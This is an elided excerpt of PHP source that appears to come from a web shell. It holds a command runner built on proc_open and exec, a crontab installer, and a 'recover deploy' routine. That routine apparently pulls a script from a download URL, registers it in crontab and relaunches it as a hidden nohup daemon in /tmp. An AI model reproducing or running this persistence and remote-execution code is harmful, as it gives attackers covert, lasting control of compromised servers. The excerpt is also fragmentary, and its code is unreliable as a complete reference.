...
function runTerminal($command, $cwd, $timeoutSec = 0)
{
    ...
    if ($timeoutSec > 0) {
        ...
        while (true) {
            ...
            if (microtime(true) >= $deadline) {
                ...
                return array('output' => $out, 'exit_code' => 124, 'timed_out' => true);
            }
            usleep(50000);
        }
        // drain remaining
...
function setCrontab($content)
{
    ...
    $result = geckoShellRun('crontab ' . escapeshellarg($tmp), $GLOBALS['baseDir'], 25);
    @unlink($tmp);
    if (!empty($result['timed_out'])) {
...
function geckoShellRunWithMethod($method, $command, $full, $cwd, $timeoutSec)
{
    try {
        if ($method === 'proc_open') {
            ...
            $r = runTerminal($command, $cwd, $timeoutSec);
            if (!is_array($r)) {
...
function geckoRecoverDeployViaRemoteCronSh($dirPath, $fileName, $downloadUrl)
{
    ...
    $cmd = 'bash ' . escapeshellarg($tmpCron);
...
BASH;
    ...
    if (!empty($cronSave['ok'])) {
        ...
        $cronTry = runTerminal('crontab ' . escapeshellarg($cronTmp), '/tmp', 25);
        @unlink($cronTmp);
    ...
    runTerminal(
        'bash -c ' . escapeshellarg('nohup bash ' . escapeshellarg($execPath) . ' --daemon >/dev/null 2>&1 &'),
        '/tmp',
        10
    );
    ...
    if ($pid <= 0) {
        @exec('nohup bash ' . escapeshellarg($execPath) . ' --daemon >/dev/null 2>&1 &');
        usleep(1000000);
        if (is_file($pidFile)) {
            $pid = (int)trim((string)@file_get_contents($pidFile));
        }
    ...
    runTerminal('bash ' . escapeshellarg($execPath) . ' --recover', '/tmp', 60);
    if (is_file($pidFile)) {
...
function btPersistenceScanConfigFiles($roots, $baseDir, $patterns, &$warnCount, $names, $sectionTitle, $maxDepth, $maxFiles)
{
    ...
    if (!$isWin) {
        $nameParts = array();
        foreach ($names as $n) {
            $nameParts[] = '-name ' . escapeshellarg($n);
        }
        foreach ($roots as $root) {
            if (count($files) >= $maxFiles) break;
            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth ' . (int)$maxDepth . ' \( ' . implode(' -o ', $nameParts) . ' \) -type f 2>/dev/null | head -' . (int)($maxFiles - count($files));
            $out = runTerminal($cmd, $baseDir);
            foreach (explode("\n", $out['output']) as $f) {
                $f = trim($f);
